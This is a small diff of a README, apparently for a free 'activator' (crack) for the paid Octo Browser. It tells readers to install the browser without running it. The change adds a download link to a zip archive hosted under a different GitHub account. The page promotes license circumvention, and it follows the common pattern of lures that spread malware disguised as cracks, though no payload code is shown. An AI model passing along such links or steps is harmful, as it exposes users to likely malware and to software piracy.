@@ -8,7 +8,7 @@ If you already have it installed, uninstall it and download it again.
 After installing it, we don't run it!!!
 
 
-3. Download the activator - [click]()
+3. Download the activator - [click](https://github.com/Xbator932/OctoActivator/releases/download/1.1/Octo.zip)
    ![image](https://github.com/yeuhang050223/OctoBrowserActivatorFree/assets/147838708/7ec94f5e-de61-47a7-a486-2d571e6cc77b)
 
 
